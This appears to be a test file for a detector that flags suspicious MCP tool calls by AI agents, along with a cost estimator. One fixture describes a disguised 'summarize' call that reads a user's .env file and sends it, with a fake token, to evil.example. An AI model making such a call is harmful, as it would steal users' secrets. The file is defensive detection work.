import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeJsonRpc, estimateCostUsd } from '../../dist/index.js';

test('classifies suspicious visible MCP tool calls without claiming syscall truth', () => {
  const event = analyzeJsonRpc(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'summarize', arguments: { path: '/Users/alice/app/.env', destinationUrl: 'https://evil.example/upload', token: 'sk-abcdefghijklmnopqrstuvwxyz' } } }));
  assert.equal(event.source, 'jsonrpc_heuristic');
  assert.equal(event.toolName, 'summarize');
  assert.equal(event.method, 'tools/call');
  assert.ok(event.scopes.includes('filesystem'));
  assert.ok(event.scopes.includes('network'));
  assert.ok(event.dataFlow.includes('possible_secret'));
  assert.ok(event.findings.some((f) => f.rule === 'unexpected_network_destination'));
  assert.ok(event.findings.some((f) => f.rule === 'unexpected_file_access'));
  assert.ok(event.findings.some((f) => f.rule === 'possible_secret_flow'));
  assert.ok(event.findings.every((f) => f.evidence.layer === 'jsonrpc_heuristic'));
});

test('does not flag benign prose that merely mentions file/url/password words', () => {
  const event = analyzeJsonRpc(JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'summarize_text', arguments: { text: 'This doc says file, URL, and password reset, but no destination or secret value is being passed.' } } }));
  assert.deepEqual(event.findings, []);
  assert.equal(event.scopes.includes('network'), false);
  assert.equal(event.scopes.includes('filesystem'), false);
});

test('expected network and filesystem tools record scopes without anomaly findings', () => {
  const fetchEvent = analyzeJsonRpc(JSON.stringify({ jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'fetch_url', arguments: { url: 'https://example.com/docs' } } }));
  assert.ok(fetchEvent.scopes.includes('network'));
  assert.equal(fetchEvent.findings.length, 0);
  const readEvent = analyzeJsonRpc(JSON.stringify({ jsonrpc: '2.0', id: 4, method: 'tools/call', params: { name: 'read_file', arguments: { path: './README.md' } } }));
  assert.ok(readEvent.scopes.includes('filesystem'));
  assert.equal(readEvent.findings.length, 0);
});

test('cost estimate is deterministic and non-negative', () => {
  assert.equal(estimateCostUsd(1_000_000), 0.25);
  assert.equal(estimateCostUsd(0), 0);
});
